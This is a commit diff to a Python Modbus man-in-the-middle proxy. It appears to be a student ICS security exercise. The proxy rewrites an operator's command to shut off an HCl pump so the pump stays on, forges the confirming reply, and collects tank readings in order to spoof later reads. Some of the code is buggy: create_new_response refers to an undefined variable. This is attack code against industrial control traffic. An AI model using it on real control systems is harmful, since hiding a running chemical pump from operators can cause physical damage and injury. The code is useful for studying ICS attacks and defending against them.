8105b6124f18d537d8d465b3d3e126a7b1352ee0
McKenzy <heavlin2@illinois.edu>
2024-12-09 00:18:45 -0600

    updated MITM to handle all the MODBUS requests/responses functions

--- mitm_async.py
+++ mitm_async.py
@@ -16,6 +16,7 @@ import asyncio
 import logging
 import sys
 import pdb
+from tank_state import *
 
 try:
     import helper
@@ -27,6 +28,8 @@ except ImportError:
 
 import pymodbus.client as modbusClient
 from pymodbus import ModbusException
+from pymodbus.payload import BinaryPayloadDecoder
+from pymodbus.constants import Endian
 
 
 _logger = logging.getLogger(__file__)
@@ -57,7 +60,8 @@ class MITMModbusProxy:
         )
         print(f">> Connected to server at {self.server_host}:{self.server_port}\n")
         changeData = False
-
+        spoofedTankState = TankStateClass()
+        count = 3
         try:
             while True:
                 data = await reader.read(1024)
@@ -65,14 +69,14 @@ class MITMModbusProxy:
                     break
 
                 parsed_data_map = self.parse_data(data)
-                
+
                 # If the client is trying to shut off the HCl pump for the first time (i.e. changeData == False)
-                if parsed_data_map['function_code'] == 0x05 and parsed_data_map["quantity_of_coils"] == b'\x00\x00' and not changeData:
+                if parsed_data_map['function_code'] == 5 and parsed_data_map["coil_value"] == 0 and not changeData:
                     changeData = True
-                
+
                 # Manipulate the data if needed, else pass along the normal client data
                 manipulated_data = self.transform_client_data(parsed_data_map) if changeData else data
-                        
+                print(manipulated_data)
                 # Forward to the server
                 server_writer.write(manipulated_data)
                 await server_writer.drain()
@@ -81,15 +85,28 @@ class MITMModbusProxy:
                 response = await server_reader.read(1024)
                 if not response:
                     break
-
-                # TODO: Manipulate server data here, if desired
+                print(response)
+                # Manipulate the server's response data, else pass along the normal state to the client
                 parsed_response_map = self.parse_response(response)
-                manipulated_data = self.transform_server_data(parsed_response_map) if changeData else response
+                
+                # If the spoofed tank state class hasn't been set up yet
+                if count != 0:
+                    if parsed_response_map["function_code"] == 0x01:
+                        spoofedTankState.set_client_cmd_coil(parsed_response_map["coils"][0])
+                    elif parsed_response_map["function_code"] == 0x02:
+                        spoofedTankState.set_hcl_input(parsed_response_map["coils"][0])
+                    elif parsed_response_map["function_code"] == 0x03:
+                        spoofedTankState.set_h_concentration(parsed_response_map["register_data"][0])
+                        spoofedTankState.set_hcl_concentration(parsed_response_map["register_data"][1])
+                    count = count - 1
+                
+                manipulated_data = self.transform_server_data(parsed_response_map, spoofedTankState) if changeData else response
                 
                 # Write the response back to the client
                 writer.write(manipulated_data)
                 await writer.drain()
-
+                # if count == 0:
+                    # exit()
         except Exception as e:
             print(f"Error: {e}")
         finally:
@@ -109,64 +126,156 @@ class MITMModbusProxy:
 
     def transform_client_data(self, parsed_data_map):
         # print("transforming client data to spoof server...")
+        # print(parsed_data_map)
 
         # Case 1: if the function_code is 'Write Single Register' and the value is 0
-        if parsed_data_map['function_code'] == 0x05 and parsed_data_map["quantity_of_coils"] == b'\x00\x00':
-            old_value = parsed_data_map["quantity_of_coils"]
-            parsed_data_map["quantity_of_coils"] = b'\xFF\x00'
-            print(f"\t**Spoofing client command: WRITE {old_value} --> WRITE {parsed_data_map["quantity_of_coils"]}")
+        if parsed_data_map['function_code'] == 5:
+            if parsed_data_map["coil_value"] == 0:
+                old_value = parsed_data_map["coil_value"]
+                new_value = 1
+                parsed_data_map["coil_value"] = new_value.to_bytes(2, byteorder='big')
+                print(f"\t**Spoofing client command: WRITE {int.to_bytes(old_value, byteorder='big')} --> WRITE {parsed_data_map["coil_value"]}")
+            else:
+                print(f"\tWARNING: WRITE {parsed_data_map["coil_value"]} not supported by MITM code...")
         
+        # Since commands 0x01, 0x02, 0x03 are reading the state from the tank, there is no need to update/spoof the values until they are going back from the server
+        elif parsed_data_map['function_code'] == 0x03:
+            print("function code 0x03...passing command to read value")
+        elif parsed_data_map['function_code'] == 0x02:
+            print("function code 0x02...passing command to read value")
+        elif parsed_data_map['function_code'] == 0x01:
+            print("function code 0x01...passing command to read value")
+        else:
+            print(f"WARNING: Function Code {parsed_data_map['function_code']} not recognized in transform_client_data()") 
+
         manipulated_data = self.create_new_command(parsed_data_map)
 
         return manipulated_data
 
-    def transform_server_data(self, parsed_response_map):
-        # print("transforming server data to spoof client...")
+    def transform_server_data(self, parsed_response_map, spoofedTankState):
+        print("transforming server data to spoof client...")
 
         # Case 1: Response to Client Case 1 (Write Register with value 0)
-        if parsed_response_map['function_code'] == 0x05 and parsed_response_map["quantity_of_coils"] == b'\xff\x00':
-            old_value = parsed_response_map["quantity_of_coils"]
-            parsed_response_map["quantity_of_coils"] = b'\x00\x00'
-            print(f"\t**Spoofing server command: WRITE {old_value} --> WRITE {parsed_response_map["quantity_of_coils"]}\n")
-        
-        manipulated_data = self.create_new_command(parsed_response_map)
+        print("yeet", parsed_response_map['function_code'])
+        if parsed_response_map["function_code"] == 5:
+            print(parsed_response_map)
+            if parsed_response_map["coil_value"] == 1:
+                old_value = parsed_response_map["coil_value"]
+                new_value = 0
+                parsed_response_map["coil_value"] = new_value.to_bytes(2,byteorder='big')
+                print(f"\t**Spoofing server command: WRITE {int.to_bytes(old_value,byteorder='big')} --> WRITE {parsed_response_map["coil_value"]}\n")
+            else:
+                print(f"\tWARNING: WRITE {parsed_response_map["coil_value"]} not supported by MITM code...")
+
+        elif parsed_response_map['function_code'] == 0x03:
+            print("function code 0x03...need to update")
+            print(spoofedTankState)
+        elif parsed_response_map['function_code'] == 0x02:
+            print("function code 0x02...need to update")
+        elif parsed_response_map['function_code'] == 0x01:
+            print("function code 0x01...need to update")
+        else:
+            print(f"WARNING: Function Code {parsed_response_map['function_code']} not recognized in transform_server_data()") 
+
+        manipulated_data = self.create_new_response(parsed_response_map)
         return manipulated_data
 
     def parse_data(self, data):
         parsed_data = {}
-        parsed_data["transaction_id"] = data[0:2]
-        parsed_data["protocol_id"] = data[2:4]
-        parsed_data["length"] = data[4:6]
+        parsed_data["transaction_id"] = int.from_bytes(data[0:2], byteorder='big')
+        parsed_data["protocol_id"] = int.from_bytes(data[2:4], byteorder='big')
+        parsed_data["length"] = int.from_bytes(data[4:6], byteorder='big')
         parsed_data["unit_id"] = data[6]
         parsed_data["function_code"] = data[7]
-        parsed_data["starting_addr"] = data[8:10]
-        parsed_data["quantity_of_coils"] = data[10:12]
+
+        if parsed_data["function_code"] in [1,2]:
+            parsed_data["coil_addr"] = int.from_bytes(data[8:10], byteorder='big')
+            parsed_data["quantity_of_coils"] = int.from_bytes(data[10:12], byteorder='big')
+        elif parsed_data["function_code"] in [3]:
+            parsed_data["register_addr"] = int.from_bytes(data[8:10], byteorder='big')
+            parsed_data["quantity_of_registers"] = int.from_bytes(data[10:12], byteorder='big')
+        elif parsed_data["function_code"] in [5]:
+            parsed_data["coil_addr"] = int.from_bytes(data[8:10], byteorder='big')
+            parsed_data["coil_value"] = int.from_bytes(data[10:12], byteorder='big')
 
         return parsed_data
     
     def parse_response(self, response):
         parsed_response = {}
-        parsed_response["transaction_id"] = response[0:2]
-        parsed_response["protocol_id"] = response[2:4]
-        parsed_response["length"] = response[4:6]
+        parsed_response["transaction_id"] = int.from_bytes(response[0:2], byteorder='big')
+        parsed_response["protocol_id"] = int.from_bytes(response[2:4], byteorder='big')
+        parsed_response["length"] = int.from_bytes(response[4:6], byteorder='big')
         parsed_response["unit_id"] = response[6]
         parsed_response["function_code"] = response[7]
-        parsed_response["starting_addr"] = response[8:10]
-        parsed_response["quantity_of_coils"] = response[10:12]
 
+        if parsed_response["function_code"] in [3, 4]:
+            parsed_response["byte_count"] = response[8]
+            register_data = response[9:9 + parsed_response["byte_count"]]
+            registers = [int.from_bytes(register_data[i:i+2], byteorder='big') for i in range(0, len(register_data), 2)]
+            parsed_response["register_data"] = registers
+        elif parsed_response["function_code"] in [1,2]:
+            parsed_response["byte_count"] = response[8]
+            coil_data = response[9:9 + parsed_response["byte_count"]]
+            coils = []
+            for byte in coil_data:
+                for bit in range(8):
+                    coils.append(bool((byte >> bit) & 1))
+            parsed_response['coils'] = coils
+        elif parsed_response["function_code"] in [5]:
+            parsed_response["coil_addr"] = int.from_bytes(response[8:10], byteorder='big')
+            parsed_response['coil_value'] = int.from_bytes(response[10:12], byteorder='big')
+        
         return parsed_response    
 
     def create_new_command(self, parsed_data_map):
         manipulated_data = b''
 
-        manipulated_data += (parsed_data_map["transaction_id"])
-        manipulated_data += (parsed_data_map["protocol_id"])
-        manipulated_data += (parsed_data_map["length"])
+        manipulated_data += (parsed_data_map["transaction_id"]).to_bytes(2, byteorder='big')
+        manipulated_data += (parsed_data_map["protocol_id"]).to_bytes(2, byteorder='big')
+        manipulated_data += (parsed_data_map["length"]).to_bytes(2, byteorder='big')
         manipulated_data += (parsed_data_map["unit_id"]).to_bytes(1, byteorder='big')
         manipulated_data += (parsed_data_map["function_code"]).to_bytes(1, byteorder='big')
-        manipulated_data += (parsed_data_map["starting_addr"])
-        manipulated_data += (parsed_data_map["quantity_of_coils"])
-        
+
+        if parsed_data_map["function_code"] in [1,2]:
+            manipulated_data += (parsed_data_map["coil_addr"]).to_bytes(2, byteorder='big')
+            manipulated_data += (parsed_data_map["quantity_of_coils"]).to_bytes(2, byteorder='big')
+        elif parsed_data_map["function_code"] in [3]:
+            manipulated_data += (parsed_data_map["register_addr"]).to_bytes(2, byteorder='big')
+            manipulated_data += (parsed_data_map["quantity_of_registers"]).to_bytes(2, byteorder='big')
+        elif parsed_data_map["function_code"] in [5]:
+            manipulated_data += (parsed_data_map["coil_addr"]).to_bytes(2, byteorder='big')
+            manipulated_data += (parsed_data_map["coil_value"])
+
+        return manipulated_data
+
+    def create_new_response(self, parsed_response_map):
+        manipulated_data = b''
+
+        manipulated_data += (parsed_response_map["transaction_id"]).to_bytes(2, byteorder='big')
+        manipulated_data += (parsed_response_map["protocol_id"]).to_bytes(2, byteorder='big')
+        manipulated_data += (parsed_response_map["length"]).to_bytes(2, byteorder='big')
+        manipulated_data += (parsed_response_map["unit_id"]).to_bytes(1, byteorder='big')
+        manipulated_data += (parsed_response_map["function_code"]).to_bytes(1, byteorder='big')
+
+        if parsed_data_map["function_code"] in [1,2]:
+            manipulated_data += (parsed_response_map["byte_count"]).to_bytes(1, byteorder='big')
+            coil_bytes = bytearray()
+            coils = parsed_response_map["coils"]
+            for i in range(0,len(coils),8):
+                byte = 0
+                for bit, coil in enumerate(coils[i:i+8]):
+                    if coil:
+                        byte |= (1 << bit)
+                coil_bytes.append(byte)
+            manipulated_data += coil_bytes
+        elif parsed_data_map["function_code"] in [3]:
+            manipulated_data += (parsed_response_map["byte_count"]).to_bytes(1, byteorder='big')
+            register_data = b''.join(reg.to_bytes(2, byteorder='big') for reg in parsed_response_map["register_data"])
+            manipulated_data += register_data
+        elif parsed_data_map["function_code"] in [5]:
+            manipulated_data += (parsed_response_map["coil_addr"]).to_bytes(2, byteorder='big')
+            manipulated_data += (parsed_response_map["coil_value"])
+
         return manipulated_data
 
 if __name__ == "__main__":
